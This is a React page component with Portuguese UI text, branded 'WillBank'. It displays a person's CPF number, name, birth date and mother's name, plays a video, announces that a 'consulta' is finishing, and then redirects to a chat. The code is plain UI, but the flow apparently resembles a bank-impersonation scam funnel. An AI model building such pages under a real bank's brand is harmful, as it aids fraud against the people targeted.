import { useEffect, useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { CreditCard, User, Calendar, Users, Search, Play, Pause } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";
import { Progress } from "@/components/ui/progress";

const Video = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const videoRef = useRef<HTMLVideoElement>(null);
  const [isPlaying, setIsPlaying] = useState(false);
  const [videoProgress, setVideoProgress] = useState(0);
  const [videoEnded, setVideoEnded] = useState(false);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }
  }, [cpfData, navigate]);

  const handleVideoClick = () => {
    if (videoRef.current) {
      if (isPlaying) {
        videoRef.current.pause();
        setIsPlaying(false);
      } else {
        videoRef.current.play();
        setIsPlaying(true);
      }
    }
  };

  const handleTimeUpdate = () => {
    if (videoRef.current) {
      const progress = (videoRef.current.currentTime / videoRef.current.duration) * 100;
      setVideoProgress(progress);
    }
  };

  const handleVideoEnd = () => {
    setIsPlaying(false);
    setVideoEnded(true);
    // Navegar para o chat após o vídeo terminar
    setTimeout(() => {
      navigate("/chat", { state: { cpfData } });
    }, 1500);
  };

  if (!cpfData) return null;

  const dataFields = [
    { icon: CreditCard, value: cpfData.cpf },
    { icon: User, value: cpfData.nome },
    { icon: Calendar, value: cpfData.dataNascimento },
    { icon: Users, value: cpfData.nomeMae },
  ];

  return (
    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
      <WillBankHeader userName={cpfData.nome.split(' ')[0].toUpperCase()} />

      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
        <WillBankCard className="w-full max-w-2xl">
          <div className="space-y-4 sm:space-y-6">
            {/* Progress bar at top */}
            <Progress value={videoProgress} className="h-1.5 sm:h-2" />

            {/* Video Player */}
            <div className="relative aspect-video bg-black rounded-xl sm:rounded-2xl overflow-hidden shadow-xl">
              <video
                ref={videoRef}
                src={`/video/video_consulta.mp4?v=${Date.now()}`}
                className="absolute inset-0 w-full h-full object-cover"
                playsInline
                onTimeUpdate={handleTimeUpdate}
                onEnded={handleVideoEnd}
                onClick={handleVideoClick}
              />
              
              {/* Play/Pause Overlay */}
              {!isPlaying && !videoEnded && (
                <div 
                  className="absolute inset-0 flex items-center justify-center bg-black/40 cursor-pointer"
                  onClick={handleVideoClick}
                >
                  <div className="w-16 h-16 sm:w-20 sm:h-20 bg-primary rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform">
                    <Play className="w-8 h-8 sm:w-10 sm:h-10 text-primary-foreground ml-1" fill="currentColor" />
                  </div>
                  <div className="absolute bottom-4 left-4 right-4 text-center">
                    <p className="text-white text-xs sm:text-sm font-medium bg-black/50 backdrop-blur-sm rounded-full px-4 py-2">
                      👆 Toque para assistir a mensagem importante
                    </p>
                  </div>
                </div>
              )}

              {/* Video Ended Overlay */}
              {videoEnded && (
                <div className="absolute inset-0 flex items-center justify-center bg-black/60">
                  <div className="text-center text-white">
                    <div className="w-16 h-16 mx-auto bg-green-500 rounded-full flex items-center justify-center mb-3">
                      <Search className="w-8 h-8 animate-pulse" />
                    </div>
                    <p className="font-bold text-base sm:text-lg">Finalizando consulta...</p>
                    <p className="text-sm opacity-80">Aguarde um momento</p>
                  </div>
                </div>
              )}

              {/* Pause indicator */}
              {isPlaying && (
                <div 
                  className="absolute inset-0 cursor-pointer"
                  onClick={handleVideoClick}
                >
                  <div className="absolute bottom-3 right-3 bg-black/60 backdrop-blur-sm rounded-full p-2 opacity-0 hover:opacity-100 transition-opacity">
                    <Pause className="w-5 h-5 text-white" />
                  </div>
                </div>
              )}
            </div>

            {/* User Data Card */}
            <div className="border-2 border-primary/40 rounded-xl sm:rounded-2xl overflow-hidden shadow-sm">
              <div className="divide-y divide-border/40">
                {dataFields.map((field, index) => {
                  const Icon = field.icon;
                  return (
                    <div key={index} className="flex items-center gap-3 p-3 sm:p-4 hover:bg-muted/30 transition-colors">
                      <div className="w-9 h-9 sm:w-11 sm:h-11 bg-gradient-to-br from-primary/20 to-primary/10 rounded-lg sm:rounded-xl flex items-center justify-center">
                        <Icon className="w-4 h-4 sm:w-5 sm:h-5 text-primary" />
                      </div>
                      <span className="font-semibold text-foreground text-sm sm:text-base">{field.value}</span>
                    </div>
                  );
                })}
                
                {/* Consulta Status */}
                <div className="flex items-center gap-3 p-3 sm:p-4 bg-primary/5">
                  <div className="w-9 h-9 sm:w-11 sm:h-11 bg-primary/20 rounded-lg sm:rounded-xl flex items-center justify-center">
                    <Search className={`w-4 h-4 sm:w-5 sm:h-5 text-primary ${!videoEnded ? 'animate-pulse' : ''}`} />
                  </div>
                  <span className={`font-medium text-sm sm:text-base ${videoEnded ? 'text-success' : 'text-muted-foreground'}`}>
                    {videoEnded ? "✓ Consulta finalizada!" : "Assista o vídeo para continuar..."}
                  </span>
                </div>
              </div>
            </div>
          </div>
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Video;
